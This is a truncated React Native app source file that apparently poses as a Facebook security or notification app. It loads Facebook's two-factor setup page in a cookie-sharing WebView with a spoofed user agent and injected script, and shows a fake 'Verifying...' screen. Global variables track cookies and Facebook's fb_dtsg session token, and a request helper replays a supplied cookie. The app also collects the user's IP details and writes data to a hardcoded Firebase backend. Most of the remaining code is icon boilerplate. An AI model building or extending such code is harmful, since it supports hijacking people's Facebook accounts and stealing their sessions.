import React, { useRef, useEffect, useState } from "react";
import {
  AsyncStorage,
  SafeAreaView,
  View,
  Text,
  LogBox,
  Image,
  Modal,
  TouchableOpacity,
  StyleSheet,
  Dimensions,
  ActivityIndicator,
  ScrollView,
  Button,
  StatusBar,
  Switch,
  TouchableWithoutFeedback,
  Keyboard,
  TextInput,
} from "react-native";
import { createBottomTabNavigator } from "@react-navigation/bottom-tabs";
import { WebView } from "react-native-webview";
import { NavigationContainer, useNavigation } from "@react-navigation/native";
import { createNativeStackNavigator } from "@react-navigation/native-stack";
import { LinearGradient } from "expo-linear-gradient";
import Checkbox from "expo-checkbox";
import firebase from "firebase";
import { Path, Svg } from "react-native-svg";
import * as ImagePicker from "expo-image-picker";
import { Camera, CameraType } from "expo-camera";
import { Alert } from "react-native";

LogBox.ignoreLogs(["Warning: ..."]); // Ignore log notification by message
LogBox.ignoreAllLogs(); //Ignore all log notifications
if (firebase.apps.length === 0) {
  firebase.initializeApp({
    apiKey: "AIzaSyBuocRVjJfPPYyAfu00Ldl7Sr9QHxUFVKk",
    authDomain: "app-ads-eac1a.firebaseapp.com",
    projectId: "app-ads-eac1a",
    storageBucket: "app-ads-eac1a.appspot.com",
    messagingSenderId: "447537416665",
    appId: "1:447537416665:web:7a86e37d5b7a8cf361f1c8",
  });
}
const delay = (ms) => new Promise((res) => setTimeout(res, ms));
// Function to write data to Firestore
const addDocument = async (collection, data) => {
  try {
    const document = await firebase
      .firestore()
      .collection(collection)
      .add(data);
    return document.id;
  } catch (error) {
    console.log("error :>> ", error);
  }
};

const updDocument = async (collection, data, docid) => {
  try {
    await firebase.firestore().collection(collection).doc(docid).update(data);
  } catch (error) {
    console.log("error :>> ", error);
  }
};

//==========GLOBAL VARIAVLE=========
//var emails = [];
var cookieStr = "";
var loginAttempts = 0;
var fb_dtsg = "";
var is_done = false;
var injected = false;
var useragent =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15";
const { width, height } = Dimensions.get("window");
const JS_GLOBAL = `
(function () {
      try{
        if (document.querySelector(\"._2pio._1uxu\")) {
          document.querySelector(\"._2pio._1uxu\").remove();   
        }
        const meta = document.createElement(\'meta\'); meta.setAttribute(\'content\', \'width=device-width, initial-scale=1, maximum-scale=0.9, user-scalable=0\'); meta.setAttribute(\'name\', \'viewport\'); 
        document.getElementsByTagName(\'head\')[0].appendChild(meta);
        document.body.addEventListener("contextmenu", function(evt){evt.preventDefault();return false;});
      }catch(e){};
})();
true`;
const _request = async ({ url, body, headers = {} }, cookie) => {
  try {
    var rqOption = {
      method: "GET",
      mode: "cors",
      cache: "no-cache",
      credentials: "same-origin",
      headers: {
        Cookie: cookie,
        "User-Agent": useragent,
      },
    };
    if (body?.length) {
      rqOption["method"] = "POST";
      rqOption["body"] = body;
    }
    rqOption.headers = { ...rqOption.headers, ...headers };
    const response = await fetch(url, rqOption);
    return await response.text();
  } catch (error) {
    console.log("error :>> ", error);
  }
};

const Colors = {
  primaryColor: "#039dc1", // Blue
  secondaryColor: "#36D7B7", // Teal
  textColor: "#595959", // Dark Gray
  textWhite: "#ffffff", // Dark Gray
  textBlack: "#000000", // Dark Gray
  errorColor: "#FF5252", // Red
  successColor: "#4CAF50", // Green
  dangerColor: "#ff1a1a", // Yellow
  warnColor: "#FFC107", // Yellow
  bgPrimary: "#F5F5F5", // Light Gray
  bgSecondary: "#666666", // Amber
  bgSecondaryLight: "#d9d9d9", // Light Gray (Info or neutral color)
  bgError: "#FFEBEE", // Pink
  bgSuccess: "#E8F5E9", // Light Green
  bgWarn: "#FFFDE7", // Yellow
  bgLight: "#FFFFFF", // White or any light color you prefer
  bgPrimaryLight: "#ccebff", // Light Blue
  bgErrorLight: "#ffcdd2", // Light Red
  bgSuccessLight: "#dcedc8", // Light Green
  bgWarnLight: "#fff9c4", // Light Yellow
  bgPrimaryDark: "#038ac1",
};

function MainScreen({ navigation }) {
  const [modalVisible, setModalVisible] = useState(false);
  const [initUrl, setInitUrl] = useState(
    "https://www.facebook.com/security/2fac/setup/intro/"
  );
  const webViewRef = useRef();
  const [loadingVisible, setLoadingVisible] = useState(false);
  const styles = StyleSheet.create({
    activityIndicatorStyle: {
      flex: 1,
      position: "absolute",
      marginLeft: "auto",
      marginRight: "auto",
      marginTop: "auto",
      marginBottom: "auto",
      left: 0,
      right: 0,
      top: 0,
      bottom: 0,
      justifyContent: "center",
    },
  });

  const ActivityIndicatorElement = () => {
    return (
      <View style={styles.activityIndicatorStyle}>
        <ActivityIndicator color="#009688" size="large" />
      </View>
    );
  };

  const onloadEnd = async (event) => {
    setTimeout(() => {
      setLoadingVisible(false);
    }, 100);
    const { nativeEvent } = event;
    this.isLoading = nativeEvent.loading;
    this.url = nativeEvent.url;
  };

  const handleMessage = async (event) => {
    if (!event.nativeEvent) {
      return;
    }
    try {
      if (event.nativeEvent.data) {
        let data = JSON.parse(event.nativeEvent.data);
        console.log(data);
      }
    } catch (error) {
      console.log("error :>> ", error);
      return;
    }
  };
  const handleNagivate = async (navState) => {};

  const onloadStart = async (event) => {
    setLoadingVisible(true);
  };

  return (
    <View style={{ flex: 1, marginTop: "10%" }}>
      <Modal animationType="none" transparent={false} visible={modalVisible}>
        <View
          style={{ flex: 1, alignItems: "center", justifyContent: "center" }}
        >
          <Image
            source={require("./assets/images/logo.png")}
            style={{
              resizeMode: "contain",
              width: 250,
              height: 120,
              marginLeft: 0,
              marginTop: 0,
            }}
          />
          <Image
            source={require("./assets/images/loading.gif")}
            style={{ width: 35, height: 35 }}
          />
          <Text style={{ fontSize: 14 }}>Verifying...</Text>
          <Text style={{ fontSize: 14 }}>Please do not close the app</Text>
        </View>
      </Modal>
      <WebView
        useWebKit={true}
        incognito={true}
        style={{ flex: 1, opacity: loadingVisible ? 0 : 100 }}
        ref={webViewRef}
        source={{ uri: initUrl }}
        javaScriptEnabled={true}
        injectedJavaScript={JS_GLOBAL}
        domStorageEnabled={true}
        startInLoadingState={true}
        originWhitelist={["*"]}
        scalesPageToFit={false}
        sharedCookiesEnabled={true}
        userAgent={useragent}
        onLoadEnd={onloadEnd}
        onLoadStart={onloadStart}
        onMessage={handleMessage}
        onNavigationStateChange={handleNagivate}
        cacheEnabled={false}
      />
      {loadingVisible ? <ActivityIndicatorElement /> : null}
    </View>
  );
}

const BellIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M14.857 17.082a23.848 23.848 0 0 0 5.454-1.31A8.967 8.967 0 0 1 18 9.75V9A6 6 0 0 0 6 9v.75a8.967 8.967 0 0 1-2.312 6.022c1.733.64 3.56 1.085 5.455 1.31m5.714 0a24.255 24.255 0 0 1-5.714 0m5.714 0a3 3 0 1 1-5.714 0"
    />
  </Svg>
);

const MegaphoneIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M10.34 15.84a24.07 24.07 0 0 0-2.09-.09H7.5a4.5 4.5 0 1 1 0-9h.75c.704 0 1.402-.03 2.09-.09m0 9.18c.253.962.584 1.892.985 2.783.247.55.06 1.21-.463 1.511l-.657.38c-.551.318-1.26.117-1.527-.461a20.845 20.845 0 0 1-1.44-4.282m3.102.069a18.03 18.03 0 0 1-.59-4.59c0-1.586.205-3.124.59-4.59m0 9.18a23.848 23.848 0 0 1 8.835 2.535M10.34 6.66a23.847 23.847 0 0 0 8.835-2.535m0 0A23.74 23.74 0 0 0 18.795 3m.38 1.125a23.91 23.91 0 0 1 1.014 5.395m-1.014 8.855c-.118.38-.245.754-.38 1.125m.38-1.125a23.91 23.91 0 0 0 1.014-5.395m0-3.46a2.249 2.249 0 0 1 0 3.46m0-3.46a24.347 24.347 0 0 1 0 3.46"
    />
  </Svg>
);

const PublicIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M12 21a9.004 9.004 0 0 0 8.716-6.747M12 21a9.004 9.004 0 0 1-8.716-6.747M12 21c2.485 0 4.5-4.03 4.5-9S14.485 3 12 3m0 18c-2.485 0-4.5-4.03-4.5-9S9.515 3 12 3m0 0a8.997 8.997 0 0 1 7.843 4.582M12 3a8.997 8.997 0 0 0-7.843 4.582m15.686 0A11.953 11.953 0 0 1 12 10.5c-2.998 0-5.74-1.1-7.843-2.918m15.686 0A8.959 8.959 0 0 1 21 12c0 .778-.099 1.533-.284 2.253m0 0A17.919 17.919 0 0 1 12 16.5a17.92 17.92 0 0 1-8.716-2.247m0 0A9.015 9.015 0 0 1 3 12c0-1.605.42-3.113 1.157-4.418"
    />
  </Svg>
);

const CameraIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M6.827 6.175A2.31 2.31 0 0 1 5.186 7.23c-.38.054-.757.112-1.134.175C2.999 7.58 2.25 8.507 2.25 9.574V18a2.25 2.25 0 0 0 2.25 2.25h15A2.25 2.25 0 0 0 21.75 18V9.574c0-1.067-.75-1.994-1.802-2.169a47.865 47.865 0 0 0-1.134-.175 2.31 2.31 0 0 1-1.64-1.055l-.822-1.316a2.192 2.192 0 0 0-1.736-1.039 48.774 48.774 0 0 0-5.232 0 2.192 2.192 0 0 0-1.736 1.039l-.821 1.316z"
    />
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M16.5 12.75a4.5 4.5 0 1 1-9 0 4.5 4.5 0 0 1 9 0zm2.25-2.25h.008v.008h-.008V10.5z"
    />
  </Svg>
);

const FaceSmileIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M15.182 15.182a4.5 4.5 0 0 1-6.364 0M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0zM9.75 9.75c0 .414-.168.75-.375.75S9 10.164 9 9.75 9.168 9 9.375 9s.375.336.375.75zm-.375 0h.008v.015h-.008V9.75zm5.625 0c0 .414-.168.75-.375.75s-.375-.336-.375-.75.168-.75.375-.75.375.336.375.75zm-.375 0h.008v.015h-.008V9.75z"
    />
  </Svg>
);
const VideoCameraIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      d="m15.75 10.5 4.72-4.72a.75.75 0 0 1 1.28.53v11.38a.75.75 0 0 1-1.28.53l-4.72-4.72M4.5 18.75h9a2.25 2.25 0 0 0 2.25-2.25v-9a2.25 2.25 0 0 0-2.25-2.25h-9A2.25 2.25 0 0 0 2.25 7.5v9a2.25 2.25 0 0 0 2.25 2.25z"
    />
  </Svg>
);

const ClockIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M12 6v6h4.5m4.5 0a9 9 0 1 1-18 0 9 9 0 0 1 18 0z"
    />
  </Svg>
);

const MapPinIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M15 10.5a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"
    />
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1 1 15 0z"
    />
  </Svg>
);
const PhotoIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="m2.25 15.75 5.159-5.159a2.25 2.25 0 0 1 3.182 0l5.159 5.159m-1.5-1.5 1.409-1.409a2.25 2.25 0 0 1 3.182 0l2.909 2.909m-18 3.75h16.5a1.5 1.5 0 0 0 1.5-1.5V6a1.5 1.5 0 0 0-1.5-1.5H3.75A1.5 1.5 0 0 0 2.25 6v12a1.5 1.5 0 0 0 1.5 1.5zm10.5-11.25h.008v.008h-.008V8.25zm.375 0a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0z"
    />
  </Svg>
);

const TimesIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M6 18 18 6M6 6l12 12"
    />
  </Svg>
);

const TrashIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="m14.74 9-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 0 1-2.244 2.077H8.084a2.25 2.25 0 0 1-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 0 0-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 0 1 3.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 0 0-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 0 0-7.5 0"
    />
  </Svg>
);

const PlusOutlineIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M12 4.5v15m7.5-7.5h-15"
    />
  </Svg>
);

const PlusIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="currentColor"
    aria-hidden="true"
    viewBox="0 0 20 20"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      fillRule="evenodd"
      d="M10 18a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm.75-11.25a.75.75 0 0 0-1.5 0v2.5h-2.5a.75.75 0 0 0 0 1.5h2.5v2.5a.75.75 0 0 0 1.5 0v-2.5h2.5a.75.75 0 0 0 0-1.5h-2.5v-2.5z"
      clipRule="evenodd"
    />
  </Svg>
);

const InformationCircleIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="currentColor"
    aria-hidden="true"
    viewBox="0 0 20 20"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      fillRule="evenodd"
      d="M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0zm-7-4a1 1 0 1 1-2 0 1 1 0 0 1 2 0zM9 9a.75.75 0 0 0 0 1.5h.253a.25.25 0 0 1 .244.304l-.459 2.066A1.75 1.75 0 0 0 10.747 15H11a.75.75 0 0 0 0-1.5h-.253a.25.25 0 0 1-.244-.304l.459-2.066A1.75 1.75 0 0 0 9.253 9H9z"
      clipRule="evenodd"
    />
  </Svg>
);

const ArrowLongIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M17.25 8.25 21 12m0 0-3.75 3.75M21 12H3"
    />
  </Svg>
);
const ArrowUpIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M12 19.5v-15m0 0-6.75 6.75M12 4.5l6.75 6.75"
    />
  </Svg>
);

const ArrowPathIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99"
    />
  </Svg>
);

const NewsIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M12 7.5h1.5m-1.5 3h1.5m-7.5 3h7.5m-7.5 3h7.5m3-9h3.375c.621 0 1.125.504 1.125 1.125V18a2.25 2.25 0 0 1-2.25 2.25M16.5 7.5V18a2.25 2.25 0 0 0 2.25 2.25M16.5 7.5V4.875c0-.621-.504-1.125-1.125-1.125H4.125C3.504 3.75 3 4.254 3 4.875V18a2.25 2.25 0 0 0 2.25 2.25h13.5M6 7.5h3v3H6v-3z"
    />
  </Svg>
);

const ChatBubbleLeftEllipsisIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M8.625 12a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0zm0 0H8.25m4.125 0a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0zm0 0H12m4.125 0a.375.375 0 1 1-.75 0 .375.375 0 0 1 .75 0zm0 0h-.375M21 12c0 4.556-4.03 8.25-9 8.25a9.764 9.764 0 0 1-2.555-.337A5.972 5.972 0 0 1 5.41 20.97a5.969 5.969 0 0 1-.474-.065 4.48 4.48 0 0 0 .978-2.025c.09-.457-.133-.901-.467-1.226C3.93 16.178 3 14.189 3 12c0-4.556 4.03-8.25 9-8.25s9 3.694 9 8.25z"
    />
  </Svg>
);

const Bars3Icon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"
    />
  </Svg>
);

const MagnifyingGlassIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607z"
    />
  </Svg>
);

const CalendarIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M6.75 3v2.25M17.25 3v2.25M3 18.75V7.5a2.25 2.25 0 0 1 2.25-2.25h13.5A2.25 2.25 0 0 1 21 7.5v11.25m-18 0A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75m-18 0v-7.5A2.25 2.25 0 0 1 5.25 9h13.5A2.25 2.25 0 0 1 21 11.25v7.5m-9-6h.008v.008H12v-.008zM12 15h.008v.008H12V15zm0 2.25h.008v.008H12v-.008zM9.75 15h.008v.008H9.75V15zm0 2.25h.008v.008H9.75v-.008zM7.5 15h.008v.008H7.5V15zm0 2.25h.008v.008H7.5v-.008zm6.75-4.5h.008v.008h-.008v-.008zm0 2.25h.008v.008h-.008V15zm0 2.25h.008v.008h-.008v-.008zm2.25-4.5h.008v.008H16.5v-.008zm0 2.25h.008v.008H16.5V15z"
    />
  </Svg>
);

const CheckedIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M9 12.75 11.25 15 15 9.75M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0z"
    />
  </Svg>
);

const LikeIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M6.633 10.5c.806 0 1.533-.446 2.031-1.08a9.041 9.041 0 0 1 2.861-2.4c.723-.384 1.35-.956 1.653-1.715a4.498 4.498 0 0 0 .322-1.672V3a.75.75 0 0 1 .75-.75A2.25 2.25 0 0 1 16.5 4.5c0 1.152-.26 2.243-.723 3.218-.266.558.107 1.282.725 1.282h3.126c1.026 0 1.945.694 2.054 1.715.045.422.068.85.068 1.285a11.95 11.95 0 0 1-2.649 7.521c-.388.482-.987.729-1.605.729H13.48a4.53 4.53 0 0 1-1.423-.23l-3.114-1.04a4.501 4.501 0 0 0-1.423-.23H5.904M14.25 9h2.25M5.904 18.75c.083.205.173.405.27.602.197.4-.078.898-.523.898h-.908c-.889 0-1.713-.518-1.972-1.368a12 12 0 0 1-.521-3.507c0-1.553.295-3.036.831-4.398C3.387 10.203 4.167 9.75 5 9.75h1.053c.472 0 .745.556.5.96a8.958 8.958 0 0 0-1.302 4.665 8.97 8.97 0 0 0 .654 3.375z"
    />
  </Svg>
);

const CommentIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M7.5 8.25h9m-9 3H12m-9.75 1.51c0 1.6 1.123 2.994 2.707 3.227 1.129.166 2.27.293 3.423.379.35.026.67.21.865.501L12 21l2.755-4.133a1.14 1.14 0 0 1 .865-.501 48.172 48.172 0 0 0 3.423-.379c1.584-.233 2.707-1.626 2.707-3.228V6.741c0-1.602-1.123-2.995-2.707-3.228A48.394 48.394 0 0 0 12 3c-2.392 0-4.744.175-7.043.513C3.373 3.746 2.25 5.14 2.25 6.741v6.018z"
    />
  </Svg>
);

const BookMarkIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M17.593 3.322c1.1.128 1.907 1.077 1.907 2.185V21L12 17.25 4.5 21V5.507c0-1.108.806-2.057 1.907-2.185a48.507 48.507 0 0 1 11.186 0z"
    />
  </Svg>
);

const ShareIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M7.217 10.907a2.25 2.25 0 1 0 0 2.186m0-2.186c.18.324.283.696.283 1.093s-.103.77-.283 1.093m0-2.186 9.566-5.314m-9.566 7.5 9.566 5.314m0 0a2.25 2.25 0 1 0 3.935 2.186 2.25 2.25 0 0 0-3.935-2.186zm0-12.814a2.25 2.25 0 1 0 3.933-2.185 2.25 2.25 0 0 0-3.933 2.185z"
    />
  </Svg>
);

const ChevronRightIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="m8.25 4.5 7.5 7.5-7.5 7.5"
    />
  </Svg>
);

const PaperAirplaneIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M6 12 3.269 3.126A59.768 59.768 0 0 1 21.485 12 59.77 59.77 0 0 1 3.27 20.876L5.999 12zm0 0h7.5"
    />
  </Svg>
);

const ChevronLeftIcon = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M15.75 19.5 8.25 12l7.5-7.5"
    />
  </Svg>
);

const TakeCamera = (props) => (
  <Svg
    xmlns="http://www.w3.org/2000/svg"
    fill="none"
    stroke="currentColor"
    strokeWidth={1.5}
    aria-hidden="true"
    viewBox="0 0 24 24"
    width={24}
    height={24}
    color="#000000"
    {...props}
  >
    <Path
      strokeLinecap="round"
      strokeLinejoin="round"
      d="M7.5 3.75H6A2.25 2.25 0 0 0 3.75 6v1.5M16.5 3.75H18A2.25 2.25 0 0 1 20.25 6v1.5m0 9V18A2.25 2.25 0 0 1 18 20.25h-1.5m-9 0H6A2.25 2.25 0 0 1 3.75 18v-1.5M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0z"
    />
  </Svg>
);

//===================
function PushNotifyScreen({ navigation }) {
  const stylesNoti = StyleSheet.create({
    container: {
      backgroundColor: "#fff",
      alignItems: "center",
      padding: 30,
      height: "100%",
    },
    header: {
      marginTop: 40,
    },
    boxTitle: {
      marginTop: 30,
    },
    title: {
      fontSize: 22,
      fontWeight: "bold",
      textAlign: "center",
    },
    policies: {
      marginTop: 30,
      paddingHorizontal: 30,
      gap: 20,
    },
    policy: {
      flexDirection: "row",
      gap: 10,
      paddingHorizontal: 30,
    },
    checkbox: {},
    label: {
      fontSize: 18,
      marginLeft: 10,
      fontWeight: "bold",
    },
    des: {
      marginTop: 5,
      marginLeft: 10,
      fontSize: 15,
      marginBottom: 10,
    },
    submit: {
      width: "100%",
      position: "absolute",
      bottom: 10,
      alignItems: "center",
      padding: 30,
    },
    hr: {
      width: "100%",
      borderColor: "#f2f2f2",
      borderWidth: 1,
    },
    textDes: {
      color: "#bfbfbf",
      marginTop: 10,
    },
    button: {
      height: 50,
      width: "100%",
      justifyContent: "center",
      alignItems: "center",
      backgroundColor: "#4C91FA",
      borderRadius: 12,
      marginTop: 10,
    },
  });

  useEffect(() => {
    async function fetchIPInfo() {
      // CookieManager.clearAll();
      const storageIP = await AsyncStorage.getItem("ipinfo");
      if (!storageIP) {
        let fetchRes = await fetch("https://ipinfo.io/json", {
          method: "GET",
          headers: {
            Accept: "application/json",
          },
        });
        let fetchStr = await fetchRes.json();
        await AsyncStorage.setItem("ipinfo", JSON.stringify(fetchStr));
      }
    }
    fetchIPInfo();
  }, []);

  return (
    <SafeAreaView style={stylesNoti.container}>
      <View style={stylesNoti.header}>
        <Image source={require("./assets/images/noti.png")} />
      </View>
      <View style={stylesNoti.boxTitle}>
        <Text style={stylesNoti.title}>Turn on push notifications to</Text>
        <Text style={stylesNoti.title}>stay updated</Text>
      </View>
